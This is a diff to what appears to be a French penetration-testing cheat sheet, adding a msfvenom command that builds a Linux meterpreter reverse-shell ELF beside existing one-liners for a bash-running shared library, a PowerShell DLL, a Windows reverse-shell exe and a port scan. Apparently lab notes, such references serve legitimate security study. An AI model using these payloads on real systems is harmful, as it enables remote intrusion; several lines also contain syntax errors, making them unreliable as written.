@@ -330,6 +330,7 @@ allow-hotplug eth0
  
 - Metasploit :
   	- Créer une librairie --> `msfconsole -p linux/x64/exec CMD=/bin/bash -f elf-so > shell.so`
+  	- Créer un ELF --> `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.11 PORT=9001 -f elf -o viens.elf`
   	- Créer une DLL --> `msfvenom -a x64 -p windows/x64/exec CMD="powershell -e XXX  -f dll -o rev.dll`
   	- Créer un exe --> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=4444 -f exe -o meterpreter_payload.exe`
   	- Scanner une machine/réseau --> `use auxiliary/scanner/portscan/tcp`
